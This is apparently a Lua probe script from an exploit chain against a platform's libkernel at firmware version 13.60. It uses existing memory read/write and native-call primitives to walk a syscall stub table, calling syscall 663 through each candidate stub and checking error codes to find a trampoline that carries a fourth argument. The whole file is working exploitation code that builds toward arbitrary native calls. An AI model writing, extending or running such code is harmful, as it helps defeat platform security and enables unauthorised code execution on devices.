-- CRASH_CLASS: MODERATE
-- PROBE 1216b: walk the verified part of the libkernel stub table and find a stub whose +7
--              carries argument 4. One syscall per candidate, no aio objects needed.
--
-- Discriminator, straight from the 13.60 body of 663:
--   * EINVAL 22 is produced only at 0x3b03a3 (count bound) and 0x3b041c (mode >= 3).
--   * count 1 passes the count bound. So EINVAL means the mode that arrived was >= 3, i.e.
--     argument 4 was still a stale r10 and the stub has no "mov r10, rcx".
--   * if the mode that arrives is 0, the bound is passed and the id loop runs. With id = 0 the
--     lookup fails at 0x3b06c0, which writes 0x80020003 into the status slot. So
--     out[0] == 0x80020003 means argument 4 ARRIVED. No aio request, no socketpair, no timeout.
--
-- Range: 0x3B0..0x10F0, the eight slots already proven to be stubs, at 0x20 stride (all eight
-- lie at offset == 0x10 mod 0x20). Every address here has been executed before with +7 and
-- answered with our own pid, so the walk stays inside the table that 1213a already proved live.

print("=== PROBE 1216b: stub table walk, one syscall per slot ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local pid0 = N(mk(20)())
local lk = N(libkernel_base)
print(string.format("[0] pid=%d libkernel=0x%X", pid0, lk))

local ids = memory.alloc(16)
local out = memory.alloc(16)
local tb  = memory.alloc(8)
wd(ids, 0) wd(ids+4, 0) wd(tb, 0)

local found = nil
local off = 0x3B0
while off <= 0x10F0 do
    wd(out, 0xAAAAAAAA)
    local ok = pcall(function() return native.fcall_with_rax(lk + off + 7, 663, ids, 1, out, 0, tb, 0) end)
    local e = ES()
    local o = rd(out)
    print(string.format("   0x%04X ok=%s out0=0x%08X err=%s", off, tostring(ok), o, e))
    if ok and o == 0x80020003 then found = off print("   *** ARG4 ARRIVED ***") break end
    if ok and not e:match("^22") then print("   (non-EINVAL, non-target result; keeping it in the log)") end
    off = off + 0x20
end
if found then print(string.format("[1] trampoline = libkernel+0x%X" , found)) else print("[1] no >=4-arg stub in 0x3B0..0x10F0") end
print("=== DONE ===")
